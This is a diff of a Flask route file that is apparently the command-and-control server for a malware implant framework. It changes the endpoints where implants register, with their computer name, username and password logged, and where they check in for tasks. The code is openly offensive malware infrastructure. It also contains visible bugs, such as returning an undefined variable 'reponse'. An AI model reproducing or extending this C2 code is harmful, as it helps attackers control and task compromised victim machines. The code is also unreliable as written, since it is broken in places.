@@ -4,7 +4,7 @@ from flask import Blueprint, request , abort
 
 from cvnt.implant_pb2 import * 
 
-from flask_wtf.csrf import *
+from flask_wtf.csrf import * # type: ignore
 
 from cvnt.db_operations import *
 
@@ -16,35 +16,44 @@ PASSWORD = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"
 
 @rpc.route("/register", methods=["POST"])
 def handle_register():
+
     ip = request.remote_addr
+    print(f"{ip}")
     reg_data = request.get_data()
+    print("2")
     register = RegisterImplant()
+    print("3")
     register.ParseFromString(reg_data)
+    print("4")
     print(f'[+] New Implant: from {request.remote_addr}')
     print(f'[+]    * ImplantID: {register.ImplantID}')
     print(f'[+]    * ComputerName: {register.ComputerName}')
     print(f'[+]    * Username: {register.Username}')
     print(f'[+]    * Password: {register.Password}')
-    
+
     if register.Password != PASSWORD:
         abort(404)
 
     r = register_implant(make_implant(register, ip))
 
     print("[+] Watch out sexy ;) a New Implant connected!")
+
     return SUCCESSFUL
 
 @rpc.route("/checkin", methods=["POST"])
 def checkin():
     reg_data = request.get_data()
-    checkin = ImplantCheckin()
-    register.ParseFromString(reg_data)
-    print(f'[+] Implant [{checkin.ImplantID}] checking in.')
-    print(f'[+] --> Response = [{checkin.Resp}]')
+    ic = ImplantCheckin()
+    ic.ParseFromString(reg_data)
+    print(f'[+] Implant [{ic.ImplantID}] checking in.')
+    print(f'[+] --> TaskResponse = [{ic.Resp}]')
 
-    implant_checking_in(checkin)
+    update_implant_last_seen(ic.ImplantID) 
+    
+    response = analyze_TaskResponse(ic.Resp)
 
-    return SUCCESSFUL 
+    # Send TaskRequest back or "" (if no tasks)
+    return reponse
 
 @rpc.route("/task/request", methods=["POST"])
 def send_task():
